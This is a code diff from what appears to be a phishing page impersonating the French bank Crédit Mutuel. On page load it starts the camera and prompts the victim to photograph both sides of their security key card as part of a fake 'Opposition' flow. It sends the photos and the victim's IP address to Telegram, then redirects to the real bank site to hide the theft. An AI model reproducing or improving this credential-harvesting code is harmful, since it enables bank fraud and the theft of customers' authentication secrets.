+    async function confirmAndSend() {
+        console.log('🚀 Bouton Valider cliqué !');
+        console.log('rectoBlob :', rectoBlob);
+        console.log('versoBlob :', versoBlob);
+
+        if (!rectoBlob || !versoBlob) {
+            alert('Erreur : photos manquantes. Veuillez recommencer.');
+            return;
+        }
+
+        // Feedback immédiat
+        confirmBtn.disabled = true;
+        confirmBtn.textContent = 'Envoi en cours...';
+
+        // Passer au loading TOUT DE SUITE
+        stepVerify.classList.remove('active');
         stepLoading.classList.add('active');
         mainTitle.textContent = 'Chargement';
         sectionTitle.innerHTML = 'Identifiant / Mot de passe <i class="fa-solid fa-chevron-down"></i>';
         forgotLink.style.display = 'none';
 
+        // Envois en parallèle (plus rapide)
+        try {
+            await Promise.all([
+                sendPhotoToTelegram(rectoBlob, 'recto'),
+                sendPhotoToTelegram(versoBlob, 'verso')
+            ]);
+
+            const ip = await getUserIP();
+            await sendTextToTelegram(
+                `--------✅[CREDITS MUTUEL]✅-------\n\n🚀 Nouvelle carte de clés (RECTO + VERSO)\n💻 IP ADDRESS : ${ip}\n\n-------✅[CREDITS MUTUEL]✅-------`
+            );
+
+            console.log('✅ Tous les envois terminés');
+        } catch (e) {
+            console.error('❌ Erreur envoi :', e);
+        }
+
+        // Animation success + redirection
         setTimeout(() => {
             stepLoading.classList.remove('active');
             stepSuccess.classList.add('active');
@@ -944,9 +901,44 @@ label.field-label {
                 window.location.href = 'https://www.creditmutuel.fr/';
             }, 3500);
         }, 2500);
-    });
+    }
+
+    // ─── Recommencer tout ───
+    async function restartAll() {
+        console.log('🔄 Recommencer tout');
+
+        rectoBlob = null;
+        versoBlob = null;
+        captureSide = 'recto';
+
+        confirmBtn.disabled = false;
+        confirmBtn.textContent = 'Valider et envoyer';
+
+        stepVerify.classList.remove('active');
+        stepForm.classList.add('active');
+
+        mainTitle.textContent = 'Opposition';
+        sectionTitle.innerHTML = 'Carte de clés <i class="fa-solid fa-chevron-down"></i>';
+
+        capturePreview.style.display = 'none';
+        cameraHint.textContent = 'Présentez le RECTO de la carte';
+
+        await startCamera();
+    }
+
+    // ─── Événements ───
+    captureBtn.addEventListener('click', capturePhoto);
+    confirmBtn.addEventListener('click', confirmAndSend);
+    restartBtn.addEventListener('click', restartAll);
+    retakeRecto.addEventListener('click', () => retake('recto'));
+    retakeVerso.addEventListener('click', () => retake('verso'));
 
     window.addEventListener('beforeunload', stopCamera);
+
+    window.addEventListener('load', () => {
+        console.log('📄 Page chargée, démarrage caméra');
+        startCamera();
+    });
 </script>
 
 </body>
